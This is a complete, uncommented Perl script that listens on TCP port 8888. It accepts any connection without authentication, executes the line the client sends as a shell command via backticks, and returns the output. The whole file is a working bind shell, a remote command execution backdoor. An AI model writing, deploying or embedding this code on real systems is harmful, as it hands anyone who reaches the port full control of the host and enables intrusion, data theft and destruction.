#!/usr/bin/perl

use strict;
use IO::Socket::INET;
use threads;

my $server_port = 8888;
my @g_threads;

sub handle {
    my $client = shift @_;
    select($client);
    $| = 1;

    my $cmd = <$client>;

    my $result = `$cmd`;
    print $client "$result";
    shutdown($client, 1);
}

sub run {
    my $server = IO::Socket::INET->new(LocalPort => $server_port,
        Type    => SOCK_STREAM,
        Reuse   => 1,
        Listen  => 10)
        or die "Could not be a tcp server on port $server_port: $!\n";

    while (my $client = $server->accept()) {
        my $tt = threads->new(\&handle, $client);
        push(@g_threads, $tt);
    }

    foreach (@g_threads) {
        $_->join();
    }

    close($server);
}

run();
